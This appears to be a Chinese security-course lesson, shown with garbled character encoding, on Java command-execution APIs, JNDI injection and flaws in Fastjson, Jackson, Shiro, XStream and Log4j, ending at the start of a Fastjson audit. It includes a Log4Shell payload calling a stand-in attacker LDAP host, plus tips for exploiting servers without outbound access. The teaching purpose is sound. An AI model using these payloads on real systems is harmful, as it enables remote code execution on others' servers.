# Javaå®‰å…¨è¯¾ç¨‹ P66ï¼šJavaåŸç”ŸRCEã€JNDIæ³¨å…¥ä¸äº”å¤§ä¸å®‰å…¨ç»„ä»¶ ğŸ›¡ï¸

![](img/2bad90e2b256ef869fe1e32e14f7beeb_1.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_3.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_5.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_7.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_9.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_11.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_13.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_15.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_17.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_19.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ Javaå®‰å…¨ä¸­çš„å‡ ä¸ªæ ¸å¿ƒçŸ¥è¯†ç‚¹ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä¼šä»‹ç»Javaä¸­èƒ½å¤Ÿå®ç°åŸç”Ÿè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„å‡ ä¸ªå…³é”®å‡½æ•°å’Œç±»ã€‚æ¥ç€ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨JNDIæ³¨å…¥çš„å®ç°åŸç†åŠå…¶åœ¨å®æˆ˜ä¸­çš„åº”ç”¨ã€‚æœ€åï¼Œä¹Ÿæ˜¯æœ¬èŠ‚è¯¾çš„é‡ç‚¹ï¼Œæˆ‘ä»¬å°†è¯¦ç»†è®²è§£å½“å‰Javaå®‰å…¨ä½“ç³»ä¸­å®æˆ˜ä¸­ç»å¸¸å‡ºç°çš„äº”å¤§ä¸å®‰å…¨ç»„ä»¶ï¼Œäº†è§£å®ƒä»¬çš„å®‰å…¨æ¼æ´æˆå› ã€åˆ©ç”¨æ–¹å¼ä»¥åŠå¦‚ä½•è¿›è¡Œé»‘ç›’ä¸ç™½ç›’åˆ†æã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_21.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_23.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_25.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_27.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_29.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_31.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_33.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_35.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_37.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_39.png)

## JavaåŸç”ŸRCEæ‰§è¡Œå‡½æ•°ä¸ç±» ğŸ”§

![](img/2bad90e2b256ef869fe1e32e14f7beeb_41.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_43.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_45.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_47.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_49.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_51.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ¦‚è¿°äº†è¯¾ç¨‹å†…å®¹ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹Javaä¸­å®ç°åŸç”ŸRCEçš„å‡ ä¸ªå…³é”®å‡½æ•°å’Œç±»ã€‚åœ¨PHPä¸­æœ‰è®¸å¤šå‡½æ•°å¯ä»¥å®ç°RCEï¼Œåœ¨Javaä¸­åŒæ ·å­˜åœ¨å‡ ä¸ªèƒ½å¤Ÿè°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç±»å’Œå‡½æ•°ã€‚è¿™äº›æ¼æ´åœ¨é»‘ç›’æµ‹è¯•ä¸­çš„å‘ç°æ€è·¯ä¸PHPç±»ä¼¼ï¼Œä¸»è¦é€šè¿‡è§‚å¯ŸURLå‚æ•°åã€æ–‡ä»¶åå’Œå‚æ•°å€¼ï¼Œå°è¯•ä¿®æ”¹å¹¶æäº¤ç‰¹å®šçš„Payloadæ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œç‚¹ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_53.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_55.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_56.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_57.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_59.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_61.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_63.png)

ä»¥ä¸‹æ˜¯Javaä¸­å®ç°RCEæ‰§è¡Œçš„äº”ä¸ªç›¸å…³ç±»å’Œå‡½æ•°ï¼š

![](img/2bad90e2b256ef869fe1e32e14f7beeb_65.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_67.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_69.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_71.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_73.png)

1.  **Runtime.exec()**
    è¿™æ˜¯Javaä¸­æœ€å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ã€‚é€šè¿‡`Runtime.getRuntime().exec(command)`æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    ```java
    Runtime.getRuntime().exec("calc");
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_75.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_77.png)

2.  **ProcessBuilder.start()**
    `ProcessBuilder`ç±»æä¾›äº†æ›´çµæ´»çš„æ–¹å¼æ¥åˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ã€‚
    ```java
    new ProcessBuilder("calc").start();
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_79.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_81.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_83.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_85.png)

3.  **GroovyShell.evaluate()** (è„šæœ¬å¼•æ“æ‰§è¡Œ)
    é€šè¿‡Groovyç­‰è„šæœ¬å¼•æ“æ‰§è¡Œä»£ç ï¼Œé—´æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚
    ```java
    new GroovyShell().evaluate("Runtime.getRuntime().exec('calc')");
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_87.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_89.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_91.png)

4.  **`java.lang.ProcessImpl` (ç‰¹å®šå¹³å°å®ç°)**
    è¿™æ˜¯`Runtime.exec()`åœ¨Windowsç­‰å¹³å°ä¸‹çš„åº•å±‚å®ç°ï¼Œç›´æ¥è°ƒç”¨ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_93.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_95.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_97.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_99.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_101.png)

5.  **ååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸­çš„å‘½ä»¤æ‰§è¡Œ**
    åœ¨å„ç§ååºåˆ—åŒ–æ¼æ´ï¼ˆå¦‚Apache Commons Collectionsï¼‰çš„åˆ©ç”¨é“¾ä¸­ï¼Œæœ€ç»ˆä¼šé€šè¿‡ä¸Šè¿°æ–¹å¼ä¹‹ä¸€æ‰§è¡Œå‘½ä»¤ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_103.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_105.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_107.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_109.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_111.png)

ç†Ÿæ‚‰è¿™äº›ç±»å’Œå‡½æ•°ï¼Œæœ‰åŠ©äºåœ¨åæœŸè¿›è¡Œæ¼æ´å®¡è®¡æ—¶ï¼Œé€šè¿‡å…¨å±€æœç´¢è¿™äº›å…³é”®è¯æ¥å®šä½æ½œåœ¨çš„RCEé£é™©ç‚¹ã€‚é»‘ç›’æµ‹è¯•ä¸»è¦ä¾é åŠŸèƒ½ç‚¹å’Œå‚æ•°ç‰¹å¾è¿›è¡ŒçŒœæµ‹ï¼Œè€Œç™½ç›’æµ‹è¯•åˆ™å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­æœç´¢è¿™äº›å±é™©å‡½æ•°å’Œå¯æ§çš„è¾“å…¥ç‚¹ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_113.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_115.png)

## JNDIæ³¨å…¥åŸç†ä¸åº”ç”¨ ğŸŒ

![](img/2bad90e2b256ef869fe1e32e14f7beeb_117.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_119.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_121.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_123.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_125.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_127.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_129.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†JavaåŸç”Ÿçš„RCEæ‰§è¡Œç‚¹ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹JNDIæ³¨å…¥ã€‚JNDIï¼ˆJava Naming and Directory Interfaceï¼‰æ˜¯Javaæä¾›çš„å‘½åå’Œç›®å½•æ¥å£ï¼Œå®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œè€Œæ˜¯ä¸€é¡¹æŠ€æœ¯ã€‚å¼€å‘äººå‘˜ä½¿ç”¨å®ƒæ¥æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºï¼ˆå¦‚æ•°æ®åº“ã€è¿œç¨‹å¯¹è±¡ï¼‰ã€‚å…¶å®‰å…¨é—®é¢˜ä¸»è¦å‡ºç°åœ¨ä¸RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰å’ŒLDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ç»“åˆä½¿ç”¨æ—¶ï¼Œå¯èƒ½è¢«åˆ©ç”¨æ¥è§¦å‘RCEã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_131.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_133.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_135.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_137.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_139.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_141.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_143.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_145.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_147.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_149.png)

JNDIæ³¨å…¥çš„æ ¸å¿ƒåŸç†æ˜¯ï¼šå½“åº”ç”¨ä½¿ç”¨JNDIæ¥å£åŠ¨æ€æŸ¥æ‰¾å¹¶åŠ è½½è¿œç¨‹å¯¹è±¡æ—¶ï¼Œå¦‚æœæŸ¥æ‰¾çš„åœ°å€ï¼ˆå¦‚RMIæˆ–LDAP URLï¼‰å¯æ§ï¼Œæ”»å‡»è€…å¯ä»¥æ­å»ºæ¶æ„çš„RMIæˆ–LDAPæœåŠ¡ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ç±»ã€‚å½“å®¢æˆ·ç«¯ååºåˆ—åŒ–å¹¶åŠ è½½è¿™ä¸ªç±»æ—¶ï¼Œå°±ä¼šæ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„ä»£ç ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_151.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_153.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_155.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_157.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_158.png)

ä»¥ä¸‹æ˜¯JNDIåˆ©ç”¨ä¸­ä¸¤ä¸ªå…³é”®åè®®ï¼š

![](img/2bad90e2b256ef869fe1e32e14f7beeb_160.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_162.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_164.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_166.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_168.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_170.png)

*   **RMI (Remote Method Invocation)**ï¼šJavaè¿œç¨‹æ–¹æ³•è°ƒç”¨æ³¨å†Œè¡¨ã€‚
*   **LDAP (Lightweight Directory Access Protocol)**ï¼šè½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_172.png)

åˆ©ç”¨å·¥å…·ï¼ˆå¦‚JNDI-Injection-Exploitï¼‰å¯ä»¥å¿«é€Ÿç”Ÿæˆæ¶æ„RMI/LDAPæœåŠ¡ã€‚ä½¿ç”¨æ—¶ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç¯å¢ƒçš„JDKç‰ˆæœ¬é€‰æ‹©åˆé€‚çš„Payloadï¼Œå› ä¸ºé«˜ç‰ˆæœ¬JDKå¯¹JNDIæ³¨å…¥æœ‰é˜²å¾¡é™åˆ¶ã€‚

**JDKç‰ˆæœ¬é™åˆ¶å‚è€ƒï¼š**
*   RMIåˆ©ç”¨å—é™åˆ¶ç‰ˆæœ¬ï¼šâ‰¤ JDK 8u113
*   LDAPåˆ©ç”¨å—é™åˆ¶ç‰ˆæœ¬ï¼šâ‰¤ JDK 8u191

![](img/2bad90e2b256ef869fe1e32e14f7beeb_174.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_176.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_178.png)

å¯¹äºé«˜ç‰ˆæœ¬JDKçš„ç»•è¿‡ï¼Œé€šå¸¸éœ€è¦ä¾èµ–ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨çš„å…¶ä»–å¯åˆ©ç”¨ç±»ï¼ˆå¦‚æŸäº›ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»ï¼‰è¿›è¡ŒäºŒæ¬¡åå°„è°ƒç”¨ï¼Œè¿™éœ€è¦æ›´æ·±å…¥çš„åˆ†æã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_180.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_182.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_184.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_186.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_188.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_190.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_192.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_194.png)

ç®€å•æ¥è¯´ï¼ŒJNDIæ˜¯æ¼æ´åˆ©ç”¨çš„ä¸€ä¸ªâ€œé€šé“â€æˆ–â€œè·³æ¿â€ã€‚æˆ‘ä»¬å­¦ä¹ JNDIæ˜¯ä¸ºäº†ç†è§£è¿™ä¸ªé€šé“å¦‚ä½•å·¥ä½œï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒå°†å…¶ä»–æ¼æ´ï¼ˆå¦‚ååºåˆ—åŒ–ï¼‰è½¬åŒ–ä¸ºå®é™…çš„RCEã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_196.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_198.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_200.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_202.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_204.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_206.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_208.png)

## Javaäº”å¤§ä¸å®‰å…¨ç»„ä»¶æ¼æ´ ğŸš¨

![](img/2bad90e2b256ef869fe1e32e14f7beeb_210.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_212.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_214.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_216.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_218.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_220.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_222.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ¢è®¨äº†JNDIæ³¨å…¥ä½œä¸ºåˆ©ç”¨é€šé“çš„ä½œç”¨ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹Javaå®‰å…¨ä½“ç³»ä¸­è‘—åçš„äº”å¤§ä¸å®‰å…¨ç»„ä»¶ã€‚è¿™äº›ç»„ä»¶å› å…¶å¹¿æ³›ä½¿ç”¨å’Œå†å²æ¼æ´çš„é«˜å±æ€§ï¼Œåœ¨å®æˆ˜ä¸­ç»å¸¸æˆä¸ºæ”»å‡»ç›®æ ‡ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯ï¼šFastjsonã€Jacksonã€Shiroã€XStreamå’ŒLog4jã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_224.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_226.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_228.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_230.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_232.png)

ä»¥ä¸‹æ˜¯è¿™äº”å¤§ç»„ä»¶çš„ç®€è¦ä»‹ç»å’Œæ¼æ´ç‰¹å¾ï¼š

![](img/2bad90e2b256ef869fe1e32e14f7beeb_234.png)

1.  **Fastjson**
    *   **ä½œç”¨**ï¼šé˜¿é‡Œå·´å·´å‡ºå“çš„é«˜æ€§èƒ½JSONè§£æåº“ã€‚
    *   **æ¼æ´æœ¬è´¨**ï¼šåœ¨ååºåˆ—åŒ–ç‰¹å®šæ„é€ çš„JSONå­—ç¬¦ä¸²æ—¶ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚
    *   **é»‘ç›’ç‰¹å¾**ï¼šè¯·æ±‚/å“åº”ä½“ä¸ºJSONæ ¼å¼ï¼Œå¯èƒ½åŒ…å«`@type`ç­‰å…³é”®å­—ã€‚å±äºå¼±ç‰¹å¾ï¼Œéœ€ç»“åˆåŠŸèƒ½ç‚¹çŒœæµ‹ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_236.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_238.png)

2.  **Jackson**
    *   **ä½œç”¨**ï¼šå¦ä¸€ä¸ªæµè¡Œçš„JSONå¤„ç†åº“ã€‚
    *   **æ¼æ´æœ¬è´¨**ï¼šä¸Fastjsonç±»ä¼¼ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚
    *   **é»‘ç›’ç‰¹å¾**ï¼šä¸Fastjsonç±»ä¼¼ï¼Œç‰¹å¾ä¸æ˜æ˜¾ï¼Œéœ€åœ¨æ¥æ”¶JSONæ•°æ®çš„åŠŸèƒ½ç‚¹æµ‹è¯•ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_240.png)

3.  **Apache Shiro**
    *   **ä½œç”¨**ï¼šå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œç”¨äºèº«ä»½éªŒè¯ã€æˆæƒç­‰ã€‚
    *   **æ¼æ´æœ¬è´¨**ï¼šååºåˆ—åŒ–æ¼æ´ï¼ˆå¦‚Shiro-550ï¼‰ï¼Œåˆ©ç”¨RememberMeåŠŸèƒ½çš„Cookieè¿›è¡Œæ”»å‡»ã€‚
    *   **é»‘ç›’å¼ºç‰¹å¾**ï¼šåœ¨ç™»å½•è¯·æ±‚çš„Cookieä¸­å­˜åœ¨`rememberMe=xxx`å­—æ®µã€‚è¿™æ˜¯éå¸¸æ˜æ˜¾çš„ç‰¹å¾ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_242.png)

4.  **XStream**
    *   **ä½œç”¨**ï¼šç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºXMLæˆ–åå‘æ“ä½œçš„åº“ã€‚
    *   **æ¼æ´æœ¬è´¨**ï¼šååºåˆ—åŒ–XMLæ•°æ®æ—¶å¯¼è‡´RCEã€‚
    *   **é»‘ç›’ç‰¹å¾**ï¼šè¯·æ±‚/å“åº”ä½“ä¸ºXMLæ ¼å¼ã€‚å±äºå¼±ç‰¹å¾ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_244.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_246.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_248.png)

5.  **Log4j / Log4j2**
    *   **ä½œç”¨**ï¼šApacheçš„æ—¥å¿—è®°å½•æ¡†æ¶ã€‚
    *   **æ¼æ´æœ¬è´¨**ï¼šæœ€è‘—åçš„æ˜¯Log4Shellï¼ˆCVE-2021-44228ï¼‰ï¼Œåœ¨è®°å½•æ—¥å¿—æ—¶å¯¹è¾“å…¥å†…å®¹è¿›è¡ŒJNDIæŸ¥æ‰¾ï¼Œå¯¼è‡´RCEã€‚
    *   **é»‘ç›’æµ‹è¯•**ï¼šå‡ ä¹åœ¨æ‰€æœ‰ç”¨æˆ·è¾“å…¥ç‚¹å°è¯•æ’å…¥JNDI Payloadï¼ˆå¦‚`${jndi:ldap://attacker.com/a}`ï¼‰ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰DNSæˆ–LDAPè¯·æ±‚å‘å‡ºã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_250.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_252.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_254.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_256.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_258.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_260.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_262.png)

**æ¼æ´åˆ©ç”¨ä¸JNDIçš„å…³ç³»**ï¼šä¸Šè¿°è®¸å¤šç»„ä»¶çš„æ¼æ´åˆ©ç”¨Payloadä¸­ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤çš„éƒ¨åˆ†å¸¸å¸¸ä¼šåµŒå…¥JNDI Lookupï¼ˆå¦‚`ldap://xxx`ï¼‰ï¼Œè¿™æ­£æ˜¯åˆ©ç”¨äº†ä¸Šä¸€èŠ‚æ‰€è®²çš„JNDIæœºåˆ¶æ¥åŠ è½½è¿œç¨‹æ¶æ„ç±»ï¼Œä»è€Œå®ç°RCEã€‚å› æ­¤ï¼Œç†è§£JNDIæ˜¯ç†è§£è¿™äº›æ¼æ´åˆ©ç”¨è¿‡ç¨‹çš„å…³é”®ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_264.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_265.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_267.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_269.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_271.png)

**ä¸å‡ºç½‘åœºæ™¯ä¸‹çš„åˆ©ç”¨æ€è·¯**ï¼šå½“ç›®æ ‡æœåŠ¡å™¨æ— æ³•å¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚ï¼ˆä¸å‡ºç½‘ï¼‰æ—¶ï¼Œä¼ ç»Ÿçš„JNDIåˆ©ç”¨æ–¹å¼ä¼šå¤±æ•ˆã€‚æ­¤æ—¶å¯ä»¥å°è¯•ä»¥ä¸‹æ€è·¯ï¼š
1.  **DNSæŸ¥è¯¢æ£€æµ‹**ï¼šä½¿ç”¨DNSLogç­‰å¹³å°ï¼Œé€šè¿‡DNSåè®®åˆ¤æ–­æ¼æ´æ˜¯å¦å­˜åœ¨ï¼ˆå› ä¸ºDNSè¯·æ±‚é€šå¸¸ä¸ä¼šè¢«ä¸¥æ ¼æ‹¦æˆªï¼‰ã€‚
2.  **å°†æ‰§è¡Œç»“æœå†™å…¥æœ¬åœ°æ–‡ä»¶**ï¼šé€šè¿‡å‘½ä»¤æ‰§è¡Œå°†ç»“æœå†™å…¥Webç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åç›´æ¥è®¿é—®è¯¥æ–‡ä»¶è¯»å–ç»“æœã€‚
3.  **å°†æ‰§è¡Œç»“æœå›æ˜¾åˆ°HTTPå“åº”ä¸­**ï¼šæ„é€ ç‰¹æ®Šçš„Payloadï¼Œè®©å‘½ä»¤æ‰§è¡Œçš„ç»“æœç›´æ¥é™„åŠ åœ¨å½“æ¬¡HTTPè¯·æ±‚çš„å“åº”åŒ…ä¸­è¿”å›ã€‚
4.  **åˆ©ç”¨ç›®æ ‡å†…ç½‘å·²æœ‰æœåŠ¡**ï¼šå¦‚å†…ç½‘ä¸­çš„LDAPæœåŠ¡è¿›è¡Œä¸­è½¬ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_273.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_275.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_277.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_279.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_281.png)

## å®æˆ˜ä»£ç å®¡è®¡æ¡ˆä¾‹ ğŸ•µï¸

![](img/2bad90e2b256ef869fe1e32e14f7beeb_283.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_285.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ç†è®ºå­¦ä¹ äº†äº”å¤§ä¸å®‰å…¨ç»„ä»¶ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®æˆ˜æ¡ˆä¾‹æ¥åŠ æ·±ç†è§£ã€‚æˆ‘ä»¬å°†åˆ†æä¸€ä¸ªä»¿å¤©çŒ«å•†åŸçš„Javaé¡¹ç›®ï¼ˆtmallï¼‰ï¼Œå®¡è®¡å…¶ä¸­æ˜¯å¦å­˜åœ¨ä¸å®‰å…¨ç»„ä»¶æ¼æ´ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_287.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_289.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_291.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_293.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_295.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_297.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_299.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_301.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_303.png)

**ç¯å¢ƒæ­å»ºç®€è¿°ï¼š**
1.  ä½¿ç”¨Mavenå¯¼å…¥é¡¹ç›®ä¾èµ–ã€‚
2.  ä¿®æ”¹æ•°æ®åº“é…ç½®ï¼Œåˆ›å»ºæ•°æ®åº“å¹¶å¯¼å…¥SQLæ–‡ä»¶ã€‚
3.  å¯åŠ¨Spring Booté¡¹ç›®ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_305.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_307.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_309.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_311.png)

**å®¡è®¡ä¸å‘ç°è¿‡ç¨‹ï¼š**

![](img/2bad90e2b256ef869fe1e32e14f7beeb_313.png)

1.  **å‘ç°Fastjsonæ¼æ´**
    *   **ä»£ç å®šä½**ï¼šå…¨å±€æœç´¢`JSON.parse`æˆ–`JSON.parseObject`ï¼Œå‘ç°`AdminController`ä¸­çš„`addProduct`æ–¹æ³•ä½¿ç”¨äº†`JSON.parseObject(productParamJson, ...)`ã€‚
    *   **ç‰ˆæœ¬ç¡®è®¤**ï¼šæŸ¥çœ‹`pom.xml`ï¼Œç¡®è®¤Fastjsonç‰ˆæœ¬ä¸º1.2.58ï¼Œè¯¥ç‰ˆæœ¬å­˜åœ¨å·²çŸ¥ååºåˆ—åŒ–æ¼æ´ã€‚
